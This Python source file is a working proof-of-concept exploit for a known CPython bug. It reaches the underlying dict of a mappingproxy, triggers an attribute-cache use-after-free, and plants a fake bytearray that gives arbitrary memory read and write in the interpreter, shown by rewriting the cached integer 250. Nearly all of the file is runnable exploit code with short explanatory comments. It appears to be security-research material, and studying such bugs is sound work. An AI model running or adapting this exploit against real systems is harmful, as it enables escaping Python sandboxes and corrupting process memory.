"""
Author: @Nico-Posada
Bug Credits: <https://bugs.python.org/issue43838>
"""

# TLDR: Get underlying dict of a mappingproxy object to exploit attribute cache UAF 
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Very old and well known bug that python devs have already confirmed won't be patched
# for whatever reason (https://bugs.python.org/issue43838#msg399022).

# This is a mix of 2 bugs, the first one is being able to access the underlying dict of a mappingproxy
# which is what `evil` implements. Once you have the underlying dict of a mappingproxy, you can modify it however you
# want and perform the second bug, the attribute cache UAF.

# The attribute cache will not get invalidated if you delete an object via the class dict, so you can add the object to the cache,
# free the object by deleting it from the dict, then grab it out of the cache. (least contrived python exploit)

class bytes_subclass(bytes):
    pass

p64 = lambda num: num.to_bytes(8, 'little')
fake_obj = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
)

SIZE = 0x100
class evil:
    mem = bytes_subclass(SIZE - 0x18)
    def __eq__(self, other):
        self.mem         # add mem to the attribute cache
        del other['mem'] # delete mem, but it still exists in the attr cache

# trigger bug
evil.__dict__ == evil()
# can use this too
# vars(evil) == evil()

# reclaim memory we deleted with data for our fake obj
_ref = fake_obj.ljust(SIZE, b"\0")

# grab the value from the attribute cache (now our evil bytearray object)
mem = evil.mem

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100